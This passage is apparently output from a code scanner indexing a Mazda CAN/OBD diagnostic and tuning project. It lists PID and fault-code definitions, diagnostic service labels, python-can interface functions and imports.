Advance\", \"(A/2)-64\", \"\u00b0\", -64, 63.5, 1, Tr"}, {"type": "protocol", "line": 102, "protocol": "PID", "content": "\"220104\": PIDDefinition(\"220104\", \"Mazda Intake Air Temperature\", \"A-40\", \"\u00b0C\", -40, 215, 1, True),"}, {"type": "protocol", "line": 103, "protocol": "PID", "content": "\"220105\": PIDDefinition(\"220105\", \"Mazda Air Flow Rate\", \"(256*A+B)/100\", \"g/s\", 0, 655.35, 2, True)"}, {"type": "protocol", "line": 104, "protocol": "PID", "content": "\"220106\": PIDDefinition(\"220106\", \"Mazda Throttle Position Sensor\", \"A*100/255\", \"%\", 0, 100, 1, Tru"}, {"type": "protocol", "line": 105, "protocol": "PID", "content": "\"220107\": PIDDefinition(\"220107\", \"Mazda Engine RPM\", \"(256*A+B)/4\", \"RPM\", 0, 16383.75, 2, True),"}, {"type": "protocol", "line": 106, "protocol": "PID", "content": "\"220108\": PIDDefinition(\"220108\", \"Mazda Vehicle Speed\", \"A\", \"km/h\", 0, 255, 1, True),"}, {"type": "protocol", "line": 107, "protocol": "PID", "content": "\"220109\": PIDDefinition(\"220109\", \"Mazda Boost Pressure\", \"A-100\", \"kPa\", -100, 155, 1, True),"}, {"type": "protocol", "line": 108, "protocol": "PID", "content": "\"22010A\": PIDDefinition(\"22010A\", \"Mazda Fuel Pressure\", \"A*10\", \"kPa\", 0, 2550, 1, True),"}, {"type": "protocol", "line": 109, "protocol": "PID", "content": "\"22010B\": PIDDefinition(\"22010B\", \"Mazda Camshaft Position\", \"A-128\", \"\u00b0\", -128, 127, 1, True),"}, {"type": "protocol", "line": 110, "protocol": "PID", "content": "\"22010C\": PIDDefinition(\"22010C\", \"Mazda Knock Sensor\", \"A\", \"count\", 0, 255, 1, True),"}, {"type": "protocol", "line": 111, "protocol": "PID", "content": "\"22010D\": PIDDefinition(\"22010D\", \"Mazda Fuel Trim Learn Value\", \"(A-128)*100/128\", \"%\", -100, 99.2,"}, {"type": "protocol", "line": 112, "protocol": "PID", "content": "\"22010E\": PIDDefinition(\"22010E\", \"Mazda Wastegate Duty Cycle\", \"A*100/255\", \"%\", 0, 100, 1, True),"}, {"type": "protocol", "line": 113, "protocol": "PID", "content": "\"22010F\": PIDDefinition(\"22010F\", \"Mazda VVT Advance Angle\", \"A-128\", \"\u00b0\", -128, 127, 1, True),"}, {"type": "protocol", "line": 116, "protocol": "PID", "content": "\"220201\": PIDDefinition(\"220201\", \"Mazda Turbo Boost Solenoid Duty\", \"A*100/255\", \"%\", 0, 100, 1, Tr"}, {"type": "protocol", "line": 117, "protocol": "PID", "content": "\"220202\": PIDDefinition(\"220202\", \"Mazda Variable Tumble Solenoid Status\", \"Bit encoded\", \"N/A\", 0, "}, {"type": "protocol", "line": 118, "protocol": "PID", "content": "\"220203\": PIDDefinition(\"220203\", \"Mazda Purge Solenoid Duty\", \"A*100/255\", \"%\", 0, 100, 1, True),"}, {"type": "protocol", "line": 119, "protocol": "PID", "content": "\"220204\": PIDDefinition(\"220204\", \"Mazda EGR Solenoid Duty\", \"A*100/255\", \"%\", 0, 100, 1, True),"}, {"type": "protocol", "line": 120, "protocol": "PID", "content": "\"220205\": PIDDefinition(\"220205\", \"Mazda A/C Compressor Status\", \"Bit encoded\", \"N/A\", 0, 0, 1, True"}, {"type": "protocol", "line": 121, "protocol": "PID", "content": "\"220206\": PIDDefinition(\"220206\", \"Mazda Cooling Fan Status\", \"Bit encoded\", \"N/A\", 0, 0, 1, True),"}, {"type": "protocol", "line": 122, "protocol": "PID", "content": "\"220207\": PIDDefinition(\"220207\", \"Mazda Brake Switch Status\", \"Bit encoded\", \"N/A\", 0, 0, 1, True),"}, {"type": "protocol", "line": 123, "protocol": "PID", "content": "\"220208\": PIDDefinition(\"220208\", \"Mazda Clutch Switch Status\", \"Bit encoded\", \"N/A\", 0, 0, 1, True)"}, {"type": "protocol", "line": 124, "protocol": "PID", "content": "\"220209\": PIDDefinition(\"220209\", \"Mazda Power Steering Pressure Switch\", \"Bit encoded\", \"N/A\", 0, 0"}, {"type": "protocol", "line": 127, "protocol": "PID", "content": "\"220301\": PIDDefinition(\"220301\", \"Mazda Transmission Fluid Temp\", \"A-40\", \"\u00b0C\", -40, 215, 1, True),"}, {"type": "protocol", "line": 128, "protocol": "PID", "content": "\"220302\": PIDDefinition(\"220302\", \"Mazda TCM Selected Gear\", \"A\", \"gear\", 0, 255, 1, True),"}, {"type": "protocol", "line": 129, "protocol": "PID", "content": "\"220303\": PIDDefinition(\"220303\", \"Mazda TCM Shift Solenoid A\", \"Bit encoded\", \"N/A\", 0, 0, 1, True)"}, {"type": "protocol", "line": 130, "protocol": "PID", "content": "\"220304\": PIDDefinition(\"220304\", \"Mazda TCM Shift Solenoid B\", \"Bit encoded\", \"N/A\", 0, 0, 1, True)"}, {"type": "protocol", "line": 131, "protocol": "PID", "content": "\"220305\": PIDDefinition(\"220305\", \"Mazda TCM Torque Converter Clutch\", \"Bit encoded\", \"N/A\", 0, 0, 1"}, {"type": "protocol", "line": 132, "protocol": "PID", "content": "\"220306\": PIDDefinition(\"220306\", \"Mazda TCM Line Pressure Solenoid\", \"A*100/255\", \"%\", 0, 100, 1, T"}, {"type": "protocol", "line": 135, "protocol": "PID", "content": "\"220401\": PIDDefinition(\"220401\", \"Mazda ABS Wheel Speed FL\", \"A\", \"km/h\", 0, 255, 1, True),"}, {"type": "protocol", "line": 136, "protocol": "PID", "content": "\"220402\": PIDDefinition(\"220402\", \"Mazda ABS Wheel Speed FR\", \"A\", \"km/h\", 0, 255, 1, True),"}, {"type": "protocol", "line": 137, "protocol": "PID", "content": "\"220403\": PIDDefinition(\"220403\", \"Mazda ABS Wheel Speed RL\", \"A\", \"km/h\", 0, 255, 1, True),"}, {"type": "protocol", "line": 138, "protocol": "PID", "content": "\"220404\": PIDDefinition(\"220404\", \"Mazda ABS Wheel Speed RR\", \"A\", \"km/h\", 0, 255, 1, True),"}, {"type": "protocol", "line": 139, "protocol": "PID", "content": "\"220405\": PIDDefinition(\"220405\", \"Mazda Steering Angle Sensor\", \"(256*A+B)-32768\", \"\u00b0\", -32768, 327"}, {"type": "protocol", "line": 140, "protocol": "PID", "content": "\"220406\": PIDDefinition(\"220406\", \"Mazda Lateral Acceleration\", \"A-128\", \"g\", -1.28, 1.27, 1, True),"}, {"type": "protocol", "line": 141, "protocol": "PID", "content": "\"220407\": PIDDefinition(\"220407\", \"Mazda Yaw Rate Sensor\", \"A-128\", \"\u00b0/sec\", -128, 127, 1, True),"}, {"type": "protocol", "line": 470, "protocol": "CAN", "content": "[\"CAN bus communication failure\", \"PCM power issue\", \"Wiring harness problem\"],"}, {"type": "protocol", "line": 471, "protocol": "CAN", "content": "[\"Check CAN bus communication\", \"Verify PCM power and ground\", \"Inspect wiring harness\"]),"}, {"type": "protocol", "line": 474, "protocol": "CAN", "content": "[\"CAN bus communication failure\", \"TCM power issue\", \"Wiring harness problem\"],"}, {"type": "protocol", "line": 475, "protocol": "CAN", "content": "[\"Check CAN bus communication\", \"Verify TCM power and ground\", \"Inspect wiring harness\"]),"}, {"type": "protocol", "line": 478, "protocol": "CAN", "content": "[\"CAN bus communication failure\", \"ABS module power issue\", \"Wiring harness problem\"],"}, {"type": "protocol", "line": 479, "protocol": "CAN", "content": "[\"Check CAN bus communication\", \"Verify ABS module power and ground\", \"Inspect wiring harness\"]),"}, {"type": "protocol", "line": 482, "protocol": "CAN", "content": "[\"CAN bus communication failure\", \"BCM power issue\", \"Wiring harness problem\"],"}, {"type": "protocol", "line": 483, "protocol": "CAN", "content": "[\"Check CAN bus communication\", \"Verify BCM power and ground\", \"Inspect wiring harness\"]),"}, {"type": "protocol", "line": 486, "protocol": "CAN", "content": "[\"CAN bus communication corruption\", \"PCM internal issue\", \"Wiring harness problem\"],"}, {"type": "protocol", "line": 487, "protocol": "CAN", "content": "[\"Check CAN bus signals\", \"Test PCM operation\", \"Inspect wiring harness\"]),"}, {"type": "protocol", "line": 490, "protocol": "CAN", "content": "[\"CAN bus communication corruption\", \"ABS module internal issue\", \"Wiring harness problem\"],"}, {"type": "protocol", "line": 491, "protocol": "CAN", "content": "[\"Check CAN bus signals\", \"Test ABS module operation\", \"Inspect wiring harness\"]),"}, {"type": "protocol", "line": 624, "protocol": "OBD", "content": "\"F140\": \"OBD Requirements\","}, {"type": "protocol", "line": 625, "protocol": "OBD", "content": "\"F141\": \"OBD Monitor Conditions\","}, {"type": "protocol", "line": 626, "protocol": "OBD", "content": "\"F142\": \"OBD Monitor Results\","}, {"type": "protocol", "line": 627, "protocol": "OBD", "content": "\"F143\": \"OBD Monitor Ratios\","}, {"type": "protocol", "line": 628, "protocol": "OBD", "content": "\"F144\": \"OBD Monitor Thresholds\","}, {"type": "protocol", "line": 664, "protocol": "PID", "content": "def get_pid_definition(self, pid: str) -> PIDDefinition:"}, {"type": "protocol", "line": 665, "protocol": "PID", "content": "\"\"\"Get complete PID definition\"\"\""}, {"type": "protocol", "line": 666, "protocol": "PID", "content": "return self.STANDARD_PIDS.get(pid.upper())"}, {"type": "protocol", "line": 672, "protocol": "PID", "content": "def get_all_pids(self) -> Dict[str, PIDDefinition]:"}, {"type": "protocol", "line": 673, "protocol": "PID", "content": "\"\"\"Get all available PIDs\"\"\""}, {"type": "protocol", "line": 674, "protocol": "PID", "content": "return self.STANDARD_PIDS"}, {"type": "protocol", "line": 680, "protocol": "PID", "content": "def get_mazda_specific_pids(self) -> Dict[str, PIDDefinition]:"}, {"type": "protocol", "line": 681, "protocol": "PID", "content": "\"\"\"Get only Mazda-specific PIDs\"\"\""}, {"type": "protocol", "line": 682, "protocol": "PID", "content": "return {pid: definition for pid, definition in self.STANDARD_PIDS.items()"}, {"type": "protocol", "line": 702, "protocol": "PID", "content": "print(\"\\n1. STANDARD PIDS AVAILABLE\")"}, {"type": "protocol", "line": 705, "protocol": "PID", "content": "print(f\"Total PIDs: {len(all_pids)}\")"}, {"type": "protocol", "line": 730, "protocol": "PID", "content": "print(f\"Mazda-specific PIDs: {len(mazda_pids)}\")"}], "hardware_assumptions": [{"type": "hardware", "line": 22, "hardware": "vehicle", "content": "VEHICLE_INFO = 0x09"}, {"type": "hardware", "line": 68, "hardware": "vehicle", "content": "\"010D\": PIDDefinition(\"010D\", \"Vehicle Speed\", \"A\", \"km/h\", 0, 255, 1),"}, {"type": "hardware", "line": 85, "hardware": "ABS", "content": "\"0143\": PIDDefinition(\"0143\", \"Absolute Load Value\", \"(256*A+B)*100/255\", \"%\", 0, 25700, 2),"}, {"type": "hardware", "line": 89, "hardware": "ABS", "content": "\"0147\": PIDDefinition(\"0147\", \"Absolute Throttle Position B\", \"A*100/255\", \"%\", 0, 100, 1),"}, {"type": "hardware", "line": 90, "hardware": "ABS", "content": "\"0148\": PIDDefinition(\"0148\", \"Absolute Throttle Position C\", \"A*100/255\", \"%\", 0, 100, 1),"}, {"type": "hardware", "line": 106, "hardware": "vehicle", "content": "\"220108\": PIDDefinition(\"220108\", \"Mazda Vehicle Speed\", \"A\", \"km/h\", 0, 255, 1, True),"}, {"type": "hardware", "line": 128, "hardware": "TCM", "content": "\"220302\": PIDDefinition(\"220302\", \"Mazda TCM Selected Gear\", \"A\", \"gear\", 0, 255, 1, True),"}, {"type": "hardware", "line": 129, "hardware": "TCM", "content": "\"220303\": PIDDefinition(\"220303\", \"Mazda TCM Shift Solenoid A\", \"Bit encoded\", \"N/A\", 0, 0, 1, True)"}, {"type": "hardware", "line": 130, "hardware": "TCM", "content": "\"220304\": PIDDefinition(\"220304\", \"Mazda TCM Shift Solenoid B\", \"Bit encoded\", \"N/A\", 0, 0, 1, True)"}, {"type": "hardware", "line": 131, "hardware": "TCM", "content": "\"220305\": PIDDefinition(\"220305\", \"Mazda TCM Torque Converter Clutch\", \"Bit encoded\", \"N/A\", 0, 0, 1"}, {"type": "hardware", "line": 132, "hardware": "TCM", "content": "\"220306\": PIDDefinition(\"220306\", \"Mazda TCM Line Pressure Solenoid\", \"A*100/255\", \"%\", 0, 100, 1, T"}, {"type": "hardware", "line": 135, "hardware": "ABS", "content": "\"220401\": PIDDefinition(\"220401\", \"Mazda ABS Wheel Speed FL\", \"A\", \"km/h\", 0, 255, 1, True),"}, {"type": "hardware", "line": 136, "hardware": "ABS", "content": "\"220402\": PIDDefinition(\"220402\", \"Mazda ABS Wheel Speed FR\", \"A\", \"km/h\", 0, 255, 1, True),"}, {"type": "hardware", "line": 137, "hardware": "ABS", "content": "\"220403\": PIDDefinition(\"220403\", \"Mazda ABS Wheel Speed RL\", \"A\", \"km/h\", 0, 255, 1, True),"}, {"type": "hardware", "line": 138, "hardware": "ABS", "content": "\"220404\": PIDDefinition(\"220404\", \"Mazda ABS Wheel Speed RR\", \"A\", \"km/h\", 0, 255, 1, True),"}, {"type": "hardware", "line": 359, "hardware": "vehicle", "content": "\"P0500\": DTCDefinition(\"P0500\", \"Vehicle Speed Sensor Circuit Malfunction\", \"MEDIUM\","}, {"type": "hardware", "line": 360, "hardware": "vehicle", "content": "[\"Vehicle speed sensor failure\", \"Wiring harness issue\", \"PCM calibration\"],"}, {"type": "hardware", "line": 363, "hardware": "vehicle", "content": "\"P0501\": DTCDefinition(\"P0501\", \"Vehicle Speed Sensor Circuit Range/Performance\", \"MEDIUM\","}, {"type": "hardware", "line": 364, "hardware": "vehicle", "content": "[\"Vehicle speed sensor erratic signal\", \"Wiring harness issue\", \"Sensor contamination\"],"}, {"type": "hardware", "line": 387, "hardware": "vehicle", "content": "\"P0610\": DTCDefinition(\"P0610\", \"Control Module Vehicle Options Error\", \"MEDIUM\","}, {"type": "hardware", "line": 397, "hardware": "vehicle", "content": "[\"Program correct VIN to PCM\", \"Verify VIN matches vehicle\"]),"}, {"type": "hardware", "line": 470, "hardware": "CAN bus", "content": "[\"CAN bus communication failure\", \"PCM power issue\", \"Wiring harness problem\"],"}, {"type": "hardware", "line": 471, "hardware": "CAN bus", "content": "[\"Check CAN bus communication\", \"Verify PCM power and ground\", \"Inspect wiring harness\"]),"}, {"type": "hardware", "line": 473, "hardware": "TCM", "content": "\"U0101\": DTCDefinition(\"U0101\", \"Lost Communication with TCM\", \"HIGH\","}, {"type": "hardware", "line": 474, "hardware": "TCM", "content": "[\"CAN bus communication failure\", \"TCM power issue\", \"Wiring harness problem\"],"}, {"type": "hardware", "line": 474, "hardware": "CAN bus", "content": "[\"CAN bus communication failure\", \"TCM power issue\", \"Wiring harness problem\"],"}, {"type": "hardware", "line": 475, "hardware": "TCM", "content": "[\"Check CAN bus communication\", \"Verify TCM power and ground\", \"Inspect wiring harness\"]),"}, {"type": "hardware", "line": 475, "hardware": "CAN bus", "content": "[\"Check CAN bus communication\", \"Verify TCM power and ground\", \"Inspect wiring harness\"]),"}, {"type": "hardware", "line": 477, "hardware": "ABS", "content": "\"U0121\": DTCDefinition(\"U0121\", \"Lost Communication with ABS Control Module\", \"MEDIUM\","}, {"type": "hardware", "line": 478, "hardware": "ABS", "content": "[\"CAN bus communication failure\", \"ABS module power issue\", \"Wiring harness problem\"],"}, {"type": "hardware", "line": 478, "hardware": "CAN bus", "content": "[\"CAN bus communication failure\", \"ABS module power issue\", \"Wiring harness problem\"],"}, {"type": "hardware", "line": 479, "hardware": "ABS", "content": "[\"Check CAN bus communication\", \"Verify ABS module power and ground\", \"Inspect wiring harness\"]),"}, {"type": "hardware", "line": 479, "hardware": "CAN bus", "content": "[\"Check CAN bus communication\", \"Verify ABS module power and ground\", \"Inspect wiring harness\"]),"}, {"type": "hardware", "line": 482, "hardware": "BCM", "content": "[\"CAN bus communication failure\", \"BCM power issue\", \"Wiring harness problem\"],"}, {"type": "hardware", "line": 482, "hardware": "CAN bus", "content": "[\"CAN bus communication failure\", \"BCM power issue\", \"Wiring harness problem\"],"}, {"type": "hardware", "line": 483, "hardware": "BCM", "content": "[\"Check CAN bus communication\", \"Verify BCM power and ground\", \"Inspect wiring harness\"]),"}, {"type": "hardware", "line": 483, "hardware": "CAN bus", "content": "[\"Check CAN bus communication\", \"Verify BCM power and ground\", \"Inspect wiring harness\"]),"}, {"type": "hardware", "line": 486, "hardware": "CAN bus", "content": "[\"CAN bus communication corruption\", \"PCM internal issue\", \"Wiring harness problem\"],"}, {"type": "hardware", "line": 487, "hardware": "CAN bus", "content": "[\"Check CAN bus signals\", \"Test PCM operation\", \"Inspect wiring harness\"]),"}, {"type": "hardware", "line": 489, "hardware": "ABS", "content": "\"U0415\": DTCDefinition(\"U0415\", \"Invalid Data Received from ABS Control Module\", \"MEDIUM\","}, {"type": "hardware", "line": 490, "hardware": "ABS", "content": "[\"CAN bus communication corruption\", \"ABS module internal issue\", \"Wiring harness problem\"],"}, {"type": "hardware", "line": 490, "hardware": "CAN bus", "content": "[\"CAN bus communication corruption\", \"ABS module internal issue\", \"Wiring harness problem\"],"}, {"type": "hardware", "line": 491, "hardware": "ABS", "content": "[\"Check CAN bus signals\", \"Test ABS module operation\", \"Inspect wiring harness\"]),"}, {"type": "hardware", "line": 491, "hardware": "CAN bus", "content": "[\"Check CAN bus signals\", \"Test ABS module operation\", \"Inspect wiring harness\"]),"}, {"type": "hardware", "line": 551, "hardware": "ECU", "content": "\"B1000\": DTCDefinition(\"B1000\", \"ECU Failure\", \"HIGH\","}, {"type": "hardware", "line": 555, "hardware": "ECU", "content": "\"B1342\": DTCDefinition(\"B1342\", \"ECU is Defective\", \"HIGH\","}, {"type": "hardware", "line": 579, "hardware": "ECU", "content": "\"11\": \"ECU Reset\","}, {"type": "hardware", "line": 584, "hardware": "ECU", "content": "\"27\": \"Security Access\","}, {"type": "hardware", "line": 603, "hardware": "ECU", "content": "\"F104\": \"ECU Serial Number\","}, {"type": "hardware", "line": 604, "hardware": "ECU", "content": "\"F105\": \"ECU Hardware Number\","}, {"type": "hardware", "line": 605, "hardware": "ECU", "content": "\"F106\": \"ECU Software Number\","}, {"type": "hardware", "line": 610, "hardware": "ECU", "content": "\"F110\": \"ECU Security Access Seed\","}, {"type": "hardware", "line": 611, "hardware": "ECU", "content": "\"F111\": \"ECU Security Access Key\","}, {"type": "hardware", "line": 612, "hardware": "ECU", "content": "\"F112\": \"Security Access Level\","}, {"type": "hardware", "line": 613, "hardware": "ECU", "content": "\"F113\": \"Security Access Attempts\","}, {"type": "hardware", "line": 614, "hardware": "ECU", "content": "\"F114\": \"Security Access Timer\","}, {"type": "hardware", "line": 629, "hardware": "vehicle", "content": "\"F150\": \"Vehicle Information\","}, {"type": "hardware", "line": 630, "hardware": "vehicle", "content": "\"F151\": \"Vehicle Options\","}, {"type": "hardware", "line": 631, "hardware": "vehicle", "content": "\"F152\": \"Vehicle Configuration\","}, {"type": "hardware", "line": 632, "hardware": "vehicle", "content": "\"F153\": \"Vehicle Identification\","}, {"type": "hardware", "line": 633, "hardware": "ECU", "content": "\"F160\": \"ECU Internal Data\","}, {"type": "hardware", "line": 634, "hardware": "ECU", "content": "\"F161\": \"ECU Memory Data\","}, {"type": "hardware", "line": 635, "hardware": "ECU", "content": "\"F162\": \"ECU Status Information\","}, {"type": "hardware", "line": 636, "hardware": "ECU", "content": "\"F163\": \"ECU Diagnostic Information\","}, {"type": "hardware", "line": 637, "hardware": "ECU", "content": "\"F164\": \"ECU Programming Information\","}, {"type": "hardware", "line": 650, "hardware": "ECU", "content": "\"F188\": \"Security Data\","}, {"type": "hardware", "line": 652, "hardware": "vehicle", "content": "\"F190\": \"Vehicle Data\","}], "security_logic": [{"type": "security_pattern", "line": 610, "pattern": "seed", "content": "\"F110\": \"ECU Security Access Seed\","}, {"type": "security_pattern", "line": 611, "pattern": "key", "content": "\"F111\": \"ECU Security Access Key\","}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "pyproject.toml", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "python_can_engine.py", "lines_read": 355, "features_found": [{"type": "function", "name": "__init__", "line": 26}, {"type": "function", "name": "__init__", "line": 56}, {"type": "function", "name": "_get_priority_from_id", "line": 242}, {"type": "function", "name": "get_interface_info", "line": 250}, {"type": "function", "name": "get_available_interfaces", "line": 278}, {"type": "function", "name": "get_available_channels", "line": 305}, {"type": "function", "name": "test_connection", "line": 336}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "mazda_can_engine", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "Bus,", "line": null}, {"type": "import", "module": "MazdaCANEngine,", "line": null}, {"type": "import", "module": "os", "line": null}], "components_found": [{"type": "class", "name": "PythonCANConfig", "line": 23}, {"type": "class", "name": "PythonCANEngine", "line": 50}], "algorithms": [], "protocols": [{"type": "protocol", "line": 2, "protocol": "CAN", "content": "PythonCANEngine - Concrete implementation of MazdaCANEngine using python-can library."}, {"type": "protocol", "line": 3, "protocol": "CAN", "content": "Provides SocketCAN, PCAN, Vector, and other interface support through python-can."}, {"type": "protocol", "line": 16, "protocol": "CAN", "content": "PYTHON_CAN_AVAILABLE = True"}, {"type": "protocol", "line": 18, "protocol": "CAN", "content": "PYTHON_CAN_AVAILABLE = False"}, {"type": "protocol", "line": 20, "protocol": "CAN", "content": "from mazda_can_engine import MazdaCANEngine, CANMessage, CANInterfaceType, CANState"}, {"type": "protocol", "line": 23, "protocol": "CAN", "content": "class PythonCANConfig:"}, {"type": "protocol", "line": 35, "protocol": "CAN", "content": "self.channel = config.get('channel', 'can0')  # can0, PCAN_USBBUS1, etc."}, {"type": "protocol", "line": 40, "protocol": "CAN", "content": "self.fd = config.get('fd', False)  # CAN FD support"}, {"type": "protocol", "line": 50, "protocol": "CAN", "content": "class PythonCANEngine(MazdaCANEngine):"}, {"type": "protocol", "line": 52, "protocol": "CAN", "content": "Python-can based implementation of MazdaCANEngine."}, {"type": "protocol", "line": 53, "protocol": "CAN", "content": "Supports various CAN interfaces through the python-can library."}, {"type": "protocol", "line": 63, "protocol": "CAN", "content": "if not PYTHON_CAN_AVAILABLE:"}, {"type": "protocol", "line": 67, "protocol": "CAN", "content": "super().__init__(interface_type=CANInterfaceType.SOCKETCAN)"}, {"type": "protocol", "line": 70, "protocol": "CAN", "content": "self.pycan_config = PythonCANConfig(config)"}, {"type": "protocol", "line": 81, "protocol": "CAN", "content": "self.logger.info(f\"PythonCANEngine initialized with {self.pycan_config.interface} interface\")"}, {"type": "protocol", "line": 83, "protocol": "CAN", "content": "async def connect(self, interface_type: Optional[CANInterfaceType] = None) -> bool:"}, {"type": "protocol", "line": 85, "protocol": "CAN", "content": "Connect to CAN interface using python-can."}, {"type": "protocol", "line": 93, "protocol": "CAN", "content": "if self.state != CANState.DISCONNECTED:"}, {"type": "protocol", "line": 98, "protocol": "CAN", "content": "self.state = CANState.CONNECTING"}, {"type": "protocol", "line": 115, "protocol": "CAN", "content": "self.state = CANState.CONNECTED"}, {"type": "protocol", "line": 124, "protocol": "CAN", "content": "self.logger.info(f\"Connected to CAN bus: {self.pycan_config.interface}:{self.pycan_config.channel}\")"}, {"type": "protocol", "line": 128, "protocol": "CAN", "content": "self.state = CANState.ERROR"}, {"type": "protocol", "line": 129, "protocol": "CAN", "content": "self.logger.error(f\"Failed to connect to CAN bus: {e}\")"}, {"type": "protocol", "line": 133, "protocol": "CAN", "content": "\"\"\"Disconnect from CAN interface.\"\"\""}, {"type": "protocol", "line": 134, "protocol": "CAN", "content": "if self.state == CANState.DISCONNECTED:"}, {"type": "protocol", "line": 139, "protocol": "CAN", "content": "self.state = CANState.DISCONNECTING"}, {"type": "protocol", "line": 154, "protocol": "CAN", "content": "self.state = CANState.DISCONNECTED"}, {"type": "protocol", "line": 155, "protocol": "CAN", "content": "self.logger.info(\"Disconnected from CAN bus\")"}, {"type": "protocol", "line": 159, "protocol": "CAN", "content": "self.state = CANState.ERROR"}, {"type": "protocol", "line": 160, "protocol": "CAN", "content": "self.logger.error(f\"Error disconnecting from CAN bus: {e}\")"}, {"type": "protocol", "line": 163, "protocol": "CAN", "content": "async def send_message(self, message: CANMessage) -> bool:"}, {"type": "protocol", "line": 165, "protocol": "CAN", "content": "Send CAN message using python-can."}, {"type": "protocol", "line": 168, "protocol": "CAN", "content": "message: CAN message to send"}, {"type": "protocol", "line": 173, "protocol": "CAN", "content": "if self.state != CANState.CONNECTED or not self.bus:"}, {"type": "protocol", "line": 197, "protocol": "CAN", "content": "self.logger.error(f\"Failed to send CAN message: {e}\")"}, {"type": "protocol", "line": 202, "protocol": "CAN", "content": "\"\"\"Background task to read CAN messages from python-can.\"\"\""}, {"type": "protocol", "line": 212, "protocol": "CAN", "content": "can_msg = CANMessage("}, {"type": "protocol", "line": 238, "protocol": "CAN", "content": "self.logger.error(f\"Error reading CAN message: {e}\")"}, {"type": "protocol", "line": 243, "protocol": "CAN", "content": "\"\"\"Get priority from CAN arbitration ID.\"\"\""}, {"type": "protocol", "line": 245, "protocol": "0x[0-9A-Fa-f]+", "content": "if arbitration_id < 0x800:"}, {"type": "protocol", "line": 262, "protocol": "CAN", "content": "'protocol': 'CAN 2.0A/B' + (' FD' if self.pycan_config.fd else ''),"}, {"type": "protocol", "line": 272, "protocol": "CAN", "content": "'protocol': 'CAN 2.0A/B' + (' FD' if self.pycan_config.fd else ''),"}, {"type": "protocol", "line": 280, "protocol": "CAN", "content": "if not PYTHON_CAN_AVAILABLE:"}, {"type": "protocol", "line": 307, "protocol": "CAN", "content": "if not PYTHON_CAN_AVAILABLE:"}, {"type": "protocol", "line": 324, "protocol": "CAN", "content": "channels.append(f'PCAN_USBBUS{i}')"}, {"type": "protocol", "line": 337, "protocol": "CAN", "content": "\"\"\"Test if CAN connection is working.\"\"\""}, {"type": "protocol", "line": 338, "protocol": "CAN", "content": "if not self.bus or self.state != CANState.CONNECTED:"}, {"type": "protocol", "line": 344, "protocol": "OBD", "content": "arbitration_id=0x7DF,  # OBD diagnostic request"}, {"type": "protocol", "line": 344, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7DF,  # OBD diagnostic request"}, {"type": "protocol", "line": 345, "protocol": "0x[0-9A-Fa-f]+", "content": "data=[0x01, 0x00],     # Test request"}, {"type": "protocol", "line": 353, "protocol": "CAN", "content": "self.logger.error(f\"CAN connection test failed: {e}\")"}], "hardware_assumptions": [{"type": "hardware", "line": 113, "hardware": "CAN bus", "content": "raise RuntimeError(\"Failed to create python-can bus\")"}, {"type": "hardware", "line": 124, "hardware": "CAN bus", "content": "self.logger.info(f\"Connected to CAN bus: {self.pycan_config.interface}:{self.pycan_config.channel}\")"}, {"type": "hardware", "line": 129, "hardware": "CAN bus", "content": "self.logger.error(f\"Failed to connect to CAN bus: {e}\")"}, {"type": "hardware", "line": 155, "hardware": "CAN bus", "content": "self.logger.info(\"Disconnected from CAN bus\")"}, {"type": "hardware", "line": 160, "hardware": "CAN bus", "content": "self.logger.error(f\"Error disconnecting from CAN bus: {e}\")"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "real_time_ai_tuner.py", "lines_read": 757, "features_found": [{"type": "function", "name": "to_dict", "line": 50}, {"type": "function", "name": "to_dict", "line": 72}, {"type": "function", "name": "__init__", "line": 119}, {"type": "function", "name": "set_telemetry", "line": 172}, {"type": "function", "name": "set_database", "line": 177}, {"type": "function", "name": "set_credentials", "line": 182}, {"type": "function", "name": "_initialize_models", "line": 187}, {"type": "function", "name": "_extract_features", "line": 296}, {"type": "function", "name": "_generate_synthetic_targets", "line": 348}, {"type": "function", "name": "_prepare_training_data", "line": 390}, {"type": "function", "name": "_apply_constraints", "line": 538}, {"type": "function", "name": "_apply_safety_margins", "line": 565}, {"type": "function", "name": "get_model_info", "line": 715}, {"type": "function", "name": "set_tuning_target", "line": 733}, {"type": "function", "name": "get_statistics", "line": 738}, {"type": "function", "name": "__del__", "line": 749}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "sklearn.ensemble", "line": null}, {"type": "import", "module": "sklearn.preprocessing", "line": null}, {"type": "import", "module": "sklearn.model_selection", "line": null}, {"type": "import", "module": "sklearn.metrics", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "models", "line": null}, {"type": "import", "module": "real_time_telemetry", "line": null}, {"type": "import", "module": "secure_database", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "pickle", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "pandas", "line": null}, {"type": "import", "module": "RandomForestRegressor,", "line": null}, {"type": "import", "module": "StandardScaler,", "line": null}, {"type": "import", "module": "train_test_split,", "line": null}, {"type": "import", "module": "mean_squared_error,", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "(", "line": null}, {"type": "import", "module": "RealTimeTelemetry", "line": null}, {"type": "import", "module": "SecureDatabase", "line": null}], "components_found": [{"type": "class", "name": "AIModelType", 